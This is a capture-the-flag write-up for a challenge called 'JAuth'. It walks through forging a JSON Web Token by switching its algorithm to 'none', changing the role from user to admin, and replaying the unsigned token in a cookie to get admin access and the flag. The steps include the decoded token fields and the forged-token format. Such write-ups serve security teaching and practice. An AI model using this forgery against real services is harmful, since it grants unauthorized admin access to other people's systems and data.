# Challenge "JAuth" Writeup

## Vulnerability: JWT Forgery with None Algorithm

### Where: JWT-based authentication with vulnerable verification of algorithm

### Impact: This challenge demonstrates how exploiting a JWT vulnerability can allow privilege escalation by modifying user roles to gain unauthorized access as an admin.

**NOTE**: The challenge involves manipulating the JSON Web Token (JWT) used for authentication by changing the algorithm to `none`, bypassing the need for a valid signature.

## Steps to reproduce:

1. **Inspect the JWT in the Cookie**:
   We were given the following JWT in the authentication cookie:

   ```
   eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzMwMjI1MTc2MzU1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMzEuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMzEuMCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzMwMjI1MTc2fQ.vSTEYWC9bkpWDJyEoyjdoOlYkNvO7BO0I5aEnJvVqb8
   ```

   We decoded this JWT and found the following structure:

   **Header**:
   ```
   {
     "typ": "JWT",
     "alg": "HS256"
   }
   ```

   **Payload**:
   ```
   {
     "auth": 1730225176355,
     "agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
     "role": "user",
     "iat": 1730225176
   }
   ```

   The `role` field was set to `user`, indicating standard access.

2. **Modify the JWT to Bypass Signature Verification**:
   Since the header showed `alg` as `HS256`, we attempted to change this to `none`, allowing us to modify the payload without a valid signature.

   **Modified Header**:
   ```
   {
     "typ": "JWT",
     "alg": "none"
   }
   ```

   **Modified Payload**:
   ```
   {
     "auth": 1730225176355,
     "agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
     "role": "admin",
     "iat": 1730225176
   }
   ```

3. **Construct the Forged Token**:
   We base64-encoded the modified header and payload, creating a new JWT without a signature by omitting the last section:

   ```
   <base64_header>.<base64_payload>.
   ```

4. **Submit the Forged Token**:
   We replaced the original cookie with our modified token and reloaded the page. This granted us admin access, revealing the flag.

## Conclusion:

By changing the JWT algorithm to `none` and adjusting the `role` to `admin`, we successfully bypassed signature verification, elevated privileges, and retrieved the flag, completing the challenge.
